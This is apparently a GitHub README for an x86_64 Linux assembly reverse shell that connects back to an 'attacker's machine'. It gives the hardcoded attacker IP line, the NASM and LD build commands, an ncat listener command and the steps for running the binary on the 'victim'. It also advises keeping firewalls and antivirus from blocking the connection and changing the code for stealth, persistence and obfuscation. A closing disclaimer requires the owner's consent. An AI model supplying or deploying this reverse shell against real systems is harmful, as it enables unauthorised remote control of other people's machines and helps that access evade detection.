# Reverse Shell in x86_64 Assembly

## Overview
This project is a simple **reverse shell** written in **x86_64 Assembly** for **Linux**. It connects back to an attacker's machine, allowing remote command execution on the target system.

## Requirements
To use this reverse shell, you need the following:

- **Attacker's Machine** (Listening for the connection):
  - Install **Nmap** (includes `ncat`)
  - A terminal to run the `ncat` listener

- **Victim's Machine** (Executing the reverse shell):
  - Linux OS with support for x86_64 assembly
  - NASM (Netwide Assembler) for assembling the script
  - LD (GNU linker) to generate the final executable

## Setup
### 1. Edit the IP Address
Before compiling, update the script to reflect the attacker's IP address. Modify the following line:

```assembly
    at sin_addr,    dd 0x1E01A8C0   ; IP address of the attacker: 192.168.1.30 (little-endian)
```

To set your attacker's IP address, convert your **IPv4 address** into **little-endian** format and replace `0x1E01A8C0` accordingly. Example:

- If the attacker's IP is `192.168.1.30`, then in little-endian it is `0x1E01A8C0`.

## Compilation
Use **NASM** and **LD** to compile the script:

```bash
nasm -f elf64 reverse_shell.asm -o reverse_shell.o
ld reverse_shell.o -o reverse_shell
```

This will generate an executable named `reverse_shell`.

## Running the Reverse Shell
### 1. Start the Listener on the Attacker's Machine
On the **attacker's** machine, use `ncat` to listen for incoming connections:

```powershell
PS C:\Users\X> ncat -lvnp 12345
```

This command:
- `-l` (listen mode)
- `-v` (verbose mode)
- `-n` (numeric-only IP addresses, no DNS resolution)
- `-p 12345` (port 12345)

### 2. Execute the Reverse Shell on the Victim's Machine
On the **victim's** machine, run the compiled binary:

```bash
./reverse_shell
```

### 3. Gain Remote Shell Access
Once executed, you should receive a **shell session** on the **attacker's** machine via `ncat`.

You can now execute commands remotely on the victim's machine.

## Notes
- Ensure that **firewall rules** and **antivirus** do not block the connection.
- You may need `sudo` privileges on the victim's machine.
- Modify the script for stealth, persistence, or obfuscation if required.

## Licensing

This reverse shell is released under the MIT license by DanielaCe18. Source code is available on GitHub.

## Disclaimer ⚠️

Usage of this reverse shell for attacking a target without prior consent of its owner is illegal. It is the end user's responsibility to obey all applicable local laws.

